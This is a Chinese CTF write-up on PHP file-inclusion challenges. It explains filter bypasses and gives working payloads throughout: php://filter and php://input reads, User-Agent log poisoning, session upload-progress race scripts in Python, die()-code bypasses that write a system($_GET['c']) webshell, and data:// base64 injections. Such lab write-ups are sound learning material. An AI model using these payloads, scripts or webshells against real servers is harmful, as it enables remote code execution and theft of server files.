---
title: PHP文件包含
date: 2026-09-11
category: CTF
tags:
  - CTF
  - Writeup
  - web
  - PHP
summary: PHP文件包含（应该不会是万字长文了）
draft: false
---


# PHP文件包含

> 接着上周的万字长文，这周接着来做PHP的文件包含，你说的对，文件包含其实有部分的内容上次的万字长文已经讲了，所以这里不会和上次那样非常详细的解释了

## 接下来是代码的解读

### pt.1.1

话不多说，我们直接开始看代码
```php
<?php
if(isset($_GET['file'])){    $file = $_GET['file'];  
    include($file);  
}else{    highlight_file(__FILE__);  
}
```

分析，get请求，请求名为 file ，我们先看看 flag.php 能不能直接读出来
好消息是没有报错，因为如果在相对目录下没有 flag.php 的话，include会报错：`failed to open stream: No such file or directory`，但是页面上什么都没有，这说明了两件事情：
1. flag.php 这个文件存在在当前相对目录下
2. flag.php 的所有内容都被php语言包含在里面，因为我们知道，include函数会自动执行里面php的语句，然后把其它非 php 的语句按照html的格式输出，而这里显然就是所有的内容都被包含在了 php 语言里面了，所以才导致了我们页面上看不到任何输出

那解决方式也很简单，我们让里面的内容把它编码了再include 不就好了吗？这样的话就检测不出php语言了

这里我们还要扩展一个知识点，虽然可能之前已经讲过了，但是放在这里更加合适一些

>include() 的参数，形如这道题的 `$file` ，它并不会直接去查找文件，而是先经过了一套解析器，去看看里面的目标文件要解析成什么格式输出，一般来说 include 会筛出有没有 `://` 这个符号，如果有的话，就会进入名单去查找 scheme ，也就是查找有没有解析这个流的工具，一般来说 php自带的是 `php://filter` 而外置的也有 `data://` `http://` (这两个需要开启allow_url_include) 

所以这道题我们需要学的就是 php://filter 这个流处理方式

它的格式是这样的
```php
php://filter/[read=]<过滤器链1>|<过滤器链2>/resource=<真实文件>
```
之前提到过，一般来说这个 `read=` 是不用写的，因为它是为了和 `write` 区分开来，默认设置都是 read。而里面的过滤链可以串联的，1的输出是2的输入，这里也给出用法

| 过滤器                                    | 作用             |
| -------------------------------------- | -------------- |
| `convert.base64-encode`                | 字节 → base64 文本 |
| `convert.base64-decode`                | 反方向            |
| `convert.iconv.X.Y`                    | 任意字符编码互转       |
| `string.rot13` / `toupper` / `tolower` | 字符变换           |
| `zlib.inflate` / `deflate`             | 压缩/解压          |
 所以要解决这道题，简直不要太简单，来一把过
 ```php
 /?file=php://filter/convert.base64-encode/resource=flag.php
 ```


### pt.1.2

不让我们输php？
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);  
    include($file);  
}else{    highlight_file(__FILE__);  
}
```

分析源码可以得到，如果我们的文件目标里但凡出现了 `php` 都会被替换成 `???` ，也就是说，我们之前打的payload里面的两块地方都会被变成 ??? ，即
 ```php
 /?file=???://filter/convert.base64-encode/resource=flag.???
 ```

对于这两块区域的问号，是这样的，我们要先了解的是前者的伪协议的 `wrapper` ，它是流包装器，负责查找你这个伪协议是不是在系统的协议处理器里面，如果有，那就按照协议处理，否则只当作普通的文件名，然而这个 wrapper 是不管你字母有没有大小写的，`php` `PHP` `pHp` 都会给你算作 php的伪协议

而再者就是这里的 `str_replace` 函数，它是非常严格的，必须要字符都是 `php` 三个小写字母才能替换，否则就不替换，所以面对前面的伪协议，我们很轻松的就能用大写的 PHP 来过这层筛子

但是很遗憾的是我们这台靶机是部署在 Linux 系统上的，因此对于目标文件，大小写是有严格的区分的，flag.php 和 flag.PHP 是两个文件，因此不能通过大小写来绕过

那要怎么办？直接走肯定是不行了，我们可以绕过，让flag.php不经过 `$file` 的校验，我们直接走伪协议，把我们要绕过的内容放到 POST 的 body，这样就可以绕过了
我们用 `php://` 的另一个功能
> `php://input` 可以以 POST 请求发送，请求体也会一同放到解析器里解析

既然这里的 PHP 解析器，那我们肯定是把请求体写成 PHP 的语言，然后里面放上我们要执行的语句，这里还要稍微补充一下 php 的一些知识
>\<?= ... ?>  是等价于 \<?php echo ...  ?>  的

一定要加外面这层内容啊，之前提到过了，如果不以 PHP 语言发送的话会被当作 HTML 语言直接输出在页面上的，所以这次我们还要用 POST 的请求发送，直接拿BP吧，主要是这两行
```http
POST /?file=PHP://input HTTP/1.1

<?=system('cat flag.php');?>  
```

这样就可以出了，里面的system语句绕过了 file 的筛查，直接过了

甚至比如这样的
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);  
    include($file);
```
因为只拦截了data，所以也可以过

当然这道题的flag并非 flag.php ，我们直接按照上次的 `<?=system('cat flag.php');?> ` 是没有显示的，所以这道题我们推测文件名并非 flag.php 于是 ls -la 之后再找到即可

```http
POST /?file=PHP://input HTTP/1.1

<?=system('cat fl0g.php');?>  
```
这么简单，真的假的


### pt.1.3 日志投毒

wrapper都不能用了是怎么个事
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);  
    include($file);
```

竟然把 `:` 也给ban了，而且因为名单是在 php解析 之后才开始过滤的（php 解析会先做URL解码， `str_replace` 拿到的是解码之后的值），无法通过我们 URL 来绕过这个名单，也就是说，所有的流包装器都无法使用，我们只能另寻他法

这个时候我们突然想到，有没有一种办法和之前我们可能做到过的一个命令执行的题目一样，我们先将我们要执行的语句先上传上去，然后上传上去的语句会单独存在一个地方，我们在这道题也是如此。

这里我们就要学习新的知识点了。
>靶场里会自带一个写文件的路子，就是 User-Agent，每次请求的 UA 都会被 nginx 写进访问日志，而这个路径也是固定存在于 `/var/log/nginx/access.log` ，那很简单了，我们只要在 UA 上写个用PHP 语言包起来（和上次一样，以 `<?= ...?>` 存在）的 cat flag ，当我们再次用include($file)，把file指向 `/var/log/nginx/access.log` 的时候，里面我们刚刚写入的 PHP 语言就会被 include 给执行，于是在那一瞬间，你就会在页面上的 .../access.log 路径看到产出

按步骤我们先把UA 改成
```http
GET / HTTP/1.1
User-Agent: <?=system('ls -la');?>
```

然后发送，在这里就可以找到
```php
/?file=/var/log/nginx/access.log
```

```text
 "total 20 drwxrwxrwx 1 www-data www-data 4096 Nov 11 12:53 . drwxr-xr-x 1 root root 4096 Oct 31 2019 .. -rw-r--r-- 1 www-data www-data 278 Nov 11 12:53 fl0g.php -rw-r--r-- 1 www-data www-data 462 Sep 16 2020 index.php -rw-r--r-- 1 www-data www-data 462 Sep 16 2020 index.php"
```

最后答案就很显然了，但是因为直接 cat flag.php 是输出源码，但是include 把 日志当 PHP 源码解析之后，php语句就会被作为HTML 语言给注释掉了，其实可以F12看源码，但是这里我们选择通过base64的方式把里面的内容给显示出来，所以最后的 UA 应该是

```http
GET / HTTP/1.1
User-Agent: <?=system('base64 fl0g.php');?>
```
也可以
```http
GET / HTTP/1.1
User-Agent: <?=system('base64 /var/www/html/fl0g.php');?>
```


### pt2.1 会话文件包含

what if
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);  
    include($file);
```
Now we unluckly ban the word `.` . That means we can't copy the payload that we used before , also , the way. So, how can we pass the filter without the word 'access.log' ?
`By the way, this also means you can't input the word like flag.php index.php etc.`

What we need to do is just to upload the sentence `<?=system('ls -la');?>` and then try to access the file that store the sentence. Once we successfully access the file , the function `include()` can deal what we put into PHP interpreter and after then, is the piece of cake.

那么我们要找的路径就是，能显示我们写入内容的同时，不含 `.` 和 `:` 

| 路径                   | 内容是否可控 |
| -------------------- | ------ |
| `/etc/passwd`        | 不可控    |
| `/proc/self/environ` | 不可控    |
| `/proc/self/cmdline` | 不可控    |
| **`/tmp/sess_<id>`** | 可控     |
这道题的原理是会话文件包含，当然我们需要知道一些知识

#### 什么是会话文件
脚本调用 `session_start()` 时候，PHP 会分配一个会话 ID，一般取自于 Cookie 的 PHPSESSID ，没有就新建。当然这里并没有主动调用 `session_start()` ，但是 `session.upload_progress` 也会自己启动
随后会把这个 ID 是数据写进单独的文件，一般来说默认是/tmp/sess_\<id\> ，当然不同的系统路径不一样
`我们举个例子，在这个实例里面，Cookie里的 PHPSESSID = cola123 ，那么保存的会话日志就会在 /tmp/sess_cola123`
而里面的文件内容则是序列化之后的键值对，就是 `键 | 序列化值`
`比如 username|s:4:"cola";role|s:5:"admin";` 不过我们这边还要补充一下序列化的知识
##### 序列化
因为内存里的数据结构比如字符串，数组，对象是没办法直接存文件的，序列化的意思就是把它变成一段纯文本
在 **PHP 序列化** 里，基本语法为 类型:元数据:值，下面给出常见的类型

| 类型码 | 含义           | 例子              | 解释                             |
| --- | ------------ | --------------- | ------------------------------ |
| `s` | string       | `s:4:"cola";`   | 4 = **字节数** `注意UTF-8里一个汉字 3字节` |
| `i` | integer      | `i:42;`         | 整数                             |
| `d` | double/float | `d:3.14;`       | 浮点                             |
| `b` | boolean      | `b:1;` / `b:0;` | 1=true 0=false                 |
| `N` | null         | `N;`            | 没有值和分号体                        |
| `a` | array        | `a:2:{...}`     | 2 = 元素个数                       |
| `O` | object       | `O:3:"Foo":...` | 类名+属性                          |
当然对于string来说，外面是要套一层 “” 的，因为里面的内容什么都会有，甚至还会出现一些二进制字节啊，所以为了让系统知道这个语句该什么时候结束，我们要设定长度，这样就是这个 s 为什么和后面的字符之间多了一个 `:4` — 它就是字节数


> PHP 有个功能是 `session.upload_progress` ，在上传文件的过程中会把进度写进单独的会话文件，一般路径在`/tmp/sess_<id>`，格式是 `upload_progress_<你在 PHP_SESSION_UPLOAD_PROGRESS 字段里填的值>|a:5:{...}以及剩下的序列化内容` ，相较于你写的内容会存在tmp的其它地方，这个路径是专门存储你这个临时会话的一些信息的，包括了开始时间，文件大小，名字以及其它。但是，它只会在文件上传的过程中存在。

也就是说，我们要想读取到上传过程中的信息，就必须让上传和读取这两件事情同时做，这是并发，也是竞态（race condition），在短时间内做两件事情

这就是脚本，非常好用，属于是力大砖飞了，其它题目也可以用
```python
import requests, threading, time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 去除报错

URL = input("ImputURL：")
SID = "lain123"
payload = "<?=system('base64 /var/www/html/fl0g.php');?>"
cookie = {"PHPSESSID": SID}

stop = threading.Event()
results = []

def uploader():
    s = requests.Session()
    s.verify = False   # Session请求跳过AC校验
    while not stop.is_set():
        try:
            s.post(URL, data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                   files={"f": ("a.txt", b"A" * 1023 * 1024)}, # 这里的文件大小要小于1MB
                   cookies=cookie, timeout=30)
        except Exception:
            pass

def trigger():
    while not stop.is_set():
        try:
            r = requests.get(URL,params={"file":f"/tmp/sess_{SID}"},cookies = cookie, timeout = 5,verify=False)
            results.append(r.text)
            if "upload_progress_" in r.text:
                print("flag:", r.text[-500:])
                stop.set()
        except Exception:
            pass
        time.sleep(0.005)

for _ in range(10):
    threading.Thread(target=trigger, daemon=True).start() # 10并发
uploader()
```

就比如这样
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    system("rm -rf /tmp/*");  
    include($file);
```
虽然 rm -rf 了，但是include仍然在它后面，并非同时执行，上传进程会在这rm之后，include之前的中间几毫秒的时间触发，把PHP 函数写出来，就可以被执行并拿到flag

或者这样
```php
define('还要秀？', dirname(__FILE__));  
set_include_path(还要秀？);  
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);  
    include($file);
```
这里相较于正常的代码，多了前面的define

前两行
```php
define('还要秀？', dirname(__FILE__));   
set_include_path(还要秀？);            
```
前面的difine是把 `还要秀？` 这个常量被 `dirname(__FILE__)` 这个给赋值了，而`__FILE__`是一个魔数，是当前这个文件的完整路径（含文件名）比如 var/www/html/index.php ，外面套了一层 `dirname()` 则是取路径，去掉文件名，所以第一行的意思就是把当前路径赋值给 `还要秀？` 这个常量

而后面第二行 `set_include_path` 是设置 include 的搜索路径，所以如果你 include 的文件是相对路径的话，它就会在刚刚设置的路径的基础上找，如果没找到才会返回原始目录找，当然我们脚本写的是绝对路径所以完全没有影响

### pt.2.2 TOCTOU OR... LUCKY ?

加强，我们来看看怎么个加强法
```php
if(isset($_GET['file'])){    $file = $_GET['file'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);  
    if(file_exists($file)){        $content = file_get_contents($file);  
        if(strpos($content, "<")>0){  
            die("error");  
        }  
        include($file);  
    }
```

相较于上次的一般的竞态，这一次，我们多了一块内容
```php
     if(file_exists($file)){       
	    $content = file_get_contents($file);  
        if(strpos($content, "<")>0){  
            die("error");  
        }  
        include($file);  
    }
```

审计一下这个代码，大体意思就是，首先要想执行这个 include 函数，必须先过 file_exists 也就是这个文件必须存在（可以是空文件但是必须存在），其次，我们在把得到的 file 内容赋给 content 之后，需要检查 content 里面有没有 `<` ，如果有就会报错，没有才会执行 include，那我们要写的命令执行可是 \<?=...?>这样的，`<` 怎么办？

其实这里有一个小小的 bug，也是这道题的突破点，`strpos` 这个函数返回的是这个符号的位置（当然在这道题的环境下，就是出现第一个 < 的位置）。但是根据我们的计算机知识，最先出现的符号的位置并不是 1，而是 0 ！当然这并不是这道题的解法，我们只是说这里有一个突破点hh

那么真正的突破点，依旧是我们之前上道题的套路，也就是利用两个函数执行的时间差来绕过
试想一下，如果一开始文件是空的，或者文件正在写入，只不过还没有写到字符 `<` ，然后在这个时刻，经过了 if 的判断，那 if 它自己也不知道啊一看文件里面没有 `<` 就给你放过了，实际上，在你执行后面通过之后的 `include` 函数那一刻之前，我们写入了 `<?=...?>` ，哪怕最后内容没有完全写完，只要写入了这一句完整的 PHP 语句，就可以执行出flag了

这就是 TOCTOU Time-Of-Check To Time-Of-Use（检查时刻 vs 使用时刻），在检查函数和使用的函数中间存在了时间差，我们就可以在这个时间差里面对我们要调用的文件进行改动

当然因为时间差太小了，可能就只有几毫秒甚至微秒，所以我们需要更多的并发，更小的文件以提高上传速度，增加触发次数

这是升级版的脚本
```python
import requests, threading, time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = input("ImputURL：")
SID = "lain123"
payload = "<?=system('base64 /var/www/html/fl0g.php');?>"
cookie = {"PHPSESSID": SID}

stop = threading.Event()
DURATION = 120

def uploader():
    s = requests.Session()
    s.verify = False
    while not stop.is_set():
        try:
            s.post(URL,
                   data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                   files={"f": ("a.txt", b"A" * 256 * 1024)},  # 改成了256KB
                   cookies=cookie, timeout=30)
        except Exception:
            pass
             
def trigger():
    s = requests.Session()
    s.verify = False
    s.cookies.update(cookie)
    while not stop.is_set():
        try:
            r = s.get(URL, params={"file": f"/tmp/sess_{SID}"}, timeout=5)
            if "upload_progress_" in r.text:
                print("HIT:", r.text, flush=True)
                stop.set()
                return
        except Exception:
            pass
        time.sleep(0.005)

for _ in range(8):    # 8并发 upload 上传
    threading.Thread(target=uploader, daemon=True).start()
for _ in range(40):   # 40并发 trigger
    threading.Thread(target=trigger, daemon=True).start()

time.sleep(DURATION)
stop.set()
print("done")
```


### pt.3.1 死亡代码绕过

有些难了喔
```php
if(isset($_GET['file'])){    
	$file = $_GET['file'];    
	$content = $_POST['content'];    
	$file = str_replace("php", "???", $file);    
	$file = str_replace("data", "???", $file);   
	$file = str_replace(":", "???", $file);    
	$file = str_replace(".", "???", $file);    
	file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
```
我们还是先来审计代码，首先相较于之前，这一关给我们加码了，在原有的 GET file 以外，我们还需要 POST 一个 content，然后就是 file 依旧被筛，最后我们看到了最后一行

```php
file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
```
这是什么意思？我们来介绍一下这个函数

> `file_put_contents($filename,$data)` 的作用是把 `$data` 写入 `$filename` 文件，当然如果 filename没有的话，就会创建一个，这个函数是集合了 `fopen + fwrite + fclose` 的三合一函数

所以这行代码的意思就是把 `"<?php die('大佬别秀了');?>"+$content` （注意这个 `.` 是连接前后文的意思）这个内容给 **覆盖** 到原有的文件，也就是说你前面无论怎么写，经过了这里，都会被覆盖成我们这句死亡代码
`当然这个函数是可以追加内容而不覆盖的，只不过格式是file_put_contents($filename,$data,FILE_APPEND)`

而且，就算我们对这个 content 来下手，因为这个死亡代码拼接在了 content 前面，所以导致了我们连 content 都没有执行，就噶了

这里的 `urldecode` 仅仅是把 file 的路径给 URL 解码了，仅此而已...吗？不对！是URL 解码！而且这里需要注意的是，这是双层URL解码，前一层解码在哪里？在
```php
$file = $_GET['file'];
```
也就是说，在这里执行PHP语句的时候，GET到的`file`已经在PHP里面自动解码了一次了，题目后面给到了`urldecode` 也是关键啊，没有了它我们就没办法以URL的格式过这个筛子。

因此我们前面可以的file写双层的URL的格式，那那种 `php` `data` `:` `.` 不是全都绕过了吗！全给你写URL编码就行了，也就是说我们现在对于前面的file已经可以完全不受到过滤器的限制了
就比如我们要写 `php://filter` URL编码两次之后，发送，然后经过 GET 解码了一次，还是URL，这次它会以一次 URL 编码的方式经过筛子，然后再到 `urldecode` 解码

接着第一个参数 `$file` 可以不仅仅是文件名，还可以是 **伪协议** ，就比如我们可以把 file 写成 `php://filter/write=convert.base64-decode/resource=a.txt` ，那么我们到时候就可以想怎么写就怎么写了

但是这里我们就会有一个疑惑：这个流程是先base64码再写入死亡代码，还是先写入死亡代码再base64解码，这决定了我们能不能绕过死亡代码的执行

那肯定是先base64解码再写啊，完整的流程就是，`"<?php die('大佬别秀了');?>".$content` 先base64解码，随后再覆写到目标文件上

可能你已经发现了，这里特意使用 base64**解码** 是因为如果我们的content是base64，而因为前面的死亡代码并非base64，这就会使得前面的语句会被解码成乱码

而且，在这里的base64解码器只认64个字符 `a-z A-Z 0-9 + /` ，除了这些字符以外的字符都会自动忽略，也就是说死亡代码在解码器那边只留下了六个字符: `phpdie` 其它的前后缀全都去掉了，这样的话，拼接的时候就只有 `phpdie`+`content...`

当然我们还需要注意一个细节，就是我们需要补位，因为 base64 是把四个字符变成了三个字节，所以前面的垃圾内容需要是四的倍数，这里如果我们把写好的base64编码之后的content直接连接的话，就会导致无法解码，所以我们要在base64后content前面加两个字符比如 `AA` 防止污染我们要的base

那至于你content里面写什么，只要是在base64范围内都是可以的...

接下来就是构造payload了，我们的流程是：先写file，然后POST发content，最后访问file

当然我们content里面写的内容，为了方便我们找flag，我们可以写 `<?=system($_GET['c']);?>`，这样的话，只要我们在访问的路径之后加一个GET参数 ?c=... 就可以自由访问了，当然你也可以写 `<?=system('base64 /var/www/html/fl0g.php');?>` 这个也是没有问题的

然后记得file的文件格式一定要是 php 后缀的，因为只有 php 文件过 nginx 才会被执行，不然就只会显示出来

源命令
```php
php://filter/write=convert.base64-decode/resource=shell.php
```
URL两次
```php
%2570h%2570%253a//filter/write=convert%252ebase64-decode/resource=shell%252e%2570h%2570
```
注意这里的PHP 和 `.` 需要手动 URL，正常的URL编码软件是不会把这些字符给URL编码的

然后我们就发送了
```http
POST /?file=%2570h%2570%253a//filter/write=convert%252ebase64-decode/resource=shell%252e%2570h%2570 HTTP/1.1
Host: ...
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="99", "Microsoft Edge";v="157", "Chromium";v="157"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://...show
Connection: close

content=AAPD89c3lzdGVtKCRfR0VUWydjJ10pOz8%2B
```
之后我们在只要输入
```php
https://.../shell.php?c=cat%20fl0g.php
```
就可以了！


再比如
```php
highlight_file(__FILE__);  
error_reporting(0);  
function filter($x){  
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){  
        die('too young too simple sometimes naive!');  
    }  
}  
$file=$_GET['file'];  
$contents=$_POST['contents'];  
filter($file);  
file_put_contents($file, "<?php die();?>".$contents);
```
大概看一眼就知道了，相较于之前的题目，这里多了对file的筛选，不让我们base64 rot13编码了，但是取消了之前 url 的解码

那可能我们这里知识还不够，我们补充一下

| 过滤器                                  | 状态        |
| ------------------------------------ | --------- |
| `convert.base64-*`                   | 封（base64） |
| `string.*`（strip_tags/toupper/rot13） | 封（string） |
| `zlib.*`                             | 封（zlib）   |
| `convert.iconv.UTF-*`                | 封（utf）    |
| `convert.iconv.UCS-2LE.UCS-2BE`      | **没封**    |
| `convert.iconv.UCS-4LE.UCS-4BE`      | **没封**    |
我们来看看后两个过滤器是个什么玩意。拿 `convert.iconv.UCS-2LE.UCS-2BE` 举例，它是让每两个字节都交换位置 ，比如你这一串字符的字节是 `AB CD EF GH` ，用了这个过滤器之后就变成了 `BA DC FE HG` ，后面的 `convert.iconv.UCS-4LE.UCS-4BE` 就是每 4 个字节倒序，这样的话我们就可以过了，当然，这里直接使用 UCS-2 的前提是前面的字符数必须是偶数个，不然会和base64一样造成污染

```http
POST /?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php HTTP/1.1
Host: ...
....

contents=?<s=syet(m_$EG[Tc']';)>?
```
contents的内容是UCS-2之后的命令，内容是和之前的命令一样的

### pt.3.2

加强的过滤
```php
if(isset($_GET['file'])){    $file = $_GET['file'];  
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){  
        die("error");  
    }  
    include($file);
```
这道题依旧过滤了很多字符，但是根据我们的之前的经验，我们想到了可以用伪协议里面的 `data://` 来绕过，还记得我们 `data://` 的格式吗 `data://text/plain;base64,....`(当然这里的base64是不可去的) ，这道题我们只要把php语言给外编码一个 base64 就行了，当然这道题还给我们禁了 `=` ，这意味着如果我们的 base64 有这个补全的 `=` ，那就过不了筛子，怎么办呢？其实很简单，我们只要把 `=` 去掉就行了，因为伪协议里面的base64解码是宽松模式，如果检测到你输入的base64位数不足，会自动帮你补全，这样的话我们就不用输 `=` 也能绕过了

就比如
```php
/?file=data://text/plain;base64,PD89c3lzdGVtKCdscyAtbGEnKTs/Pg
```
这个是 `<?=system('ls -la');?>` 的base64，去掉了尾部的两个等号，同样可以解出来，那很简单了我们接下来直接就可以cat flag了


## 总结

以上就是有关文件包含的一些内容...我还是学到不少的，希望我能一直学下去吧。
好多过滤好多发包好多伪协议awa

<blockquote style="text-align:right">Cola_CaO<br>2026.11.15</blockquote>